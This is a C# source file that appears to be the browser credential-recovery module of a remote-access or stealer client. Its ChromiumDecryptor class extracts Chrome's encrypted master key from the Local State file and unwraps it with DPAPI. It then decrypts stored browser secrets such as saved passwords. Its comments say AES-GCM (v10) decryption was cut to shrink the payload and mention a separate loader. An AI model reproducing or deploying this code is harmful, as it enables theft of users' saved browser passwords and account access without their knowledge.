﻿using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace 财源广进.Client.Recovery.Browsers
{
    public class ChromiumDecryptor
    {
        private readonly byte[] _key;

        public ChromiumDecryptor(string localStatePath)
        {
            try
            {
                if (File.Exists(localStatePath))
                {
                    string localState = File.ReadAllText(localStatePath);
                    var subStr = localState.IndexOf("encrypted_key") + "encrypted_key".Length + 3;
                    var encKeyStr = localState.Substring(subStr).Substring(0, localState.Substring(subStr).IndexOf('"'));
                    _key = ProtectedData.Unprotect(Convert.FromBase64String(encKeyStr).Skip(5).ToArray(), null,
                        DataProtectionScope.CurrentUser);
                }
            }
            catch (Exception e)
            {
                Debug.WriteLine(e);
            }
        }

        public string Decrypt(string cipherText)
        {
            try
            {
                var cipherTextBytes = Encoding.Default.GetBytes(cipherText);
                if (cipherText.StartsWith("v10") && _key != null)
                {
                    // 在 .NET 4.5.2 中，为了减小体积，我们移除 BouncyCastle
                    // 暂时跳过 v10 的解密（需要 AesGcm），以换取 2MB 的体积减小
                    // 如果必须支持 v10，建议在 Loader 中集成解密逻辑
                    return "Decryption skipped to reduce size";
                }
                return Encoding.UTF8.GetString(ProtectedData.Unprotect(cipherTextBytes, null, DataProtectionScope.CurrentUser));
            }
            catch { return string.Empty; }
        }
    }
}
